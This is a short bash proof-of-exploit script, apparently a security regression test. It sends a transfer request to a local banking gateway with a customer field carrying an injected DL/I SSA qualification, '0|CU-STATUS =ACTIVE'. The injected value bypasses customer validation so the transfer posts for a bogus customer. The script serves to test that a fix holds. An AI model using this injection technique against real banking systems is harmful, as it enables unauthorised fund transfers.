#!/usr/bin/env bash
set -euo pipefail
# LG-DLII-001 proof-of-exploit: DL/I SSA injection in the core transfer's customer validation. Posts a
# transfer whose requested_by names a NON-EXISTENT customer id but carries an injected OR
# qualification (0|CU-STATUS =ACTIVE). With alnum_customer_ids=on this is spliced into the CUSTSEG SSA raw, so
# the DL/I GU matches any ACTIVE customer and the existence check is bypassed -> the transfer POSTs.
# Fires (exit 0) when status=POSTED for a bogus requested_by. With the fix the numeric guard rejects it
# (CUSTOMER NOT FOUND). Uses valid accounts (42/43) so only the customer check is in question.
# Needs the running stack. Env: GATEWAY_URL (default http://localhost:8080).

GATEWAY_URL="${GATEWAY_URL:-http://localhost:8080}"

resp="$(curl -sS -X POST "$GATEWAY_URL/transfer" -H 'content-type: application/json' \
  -H 'X-Staff-Id: TLR001' -H 'X-Role: TELLER' -H 'X-Branch: 0007' \
  -d '{"token":"TRIGGERTOKEN0001","from_account":"000000000042","to_account":"000000000043","amount":"10.00","currency":"USD","requested_by":"0|CU-STATUS =ACTIVE"}')"

read -r status reason <<<"$(python3 -c 'import sys,json
d=json.load(sys.stdin); print(d.get("status"), (d.get("reason") or "").replace(" ","_"))' <<<"$resp")"

if [ "$status" = "POSTED" ]; then
  echo "LG-DLII-001 FIRED: SSA injection bypassed customer validation, transfer POSTED -> $resp"
  exit 0
fi
echo "LG-DLII-001 not fired: status=$status reason=$reason ($resp)" >&2
exit 1
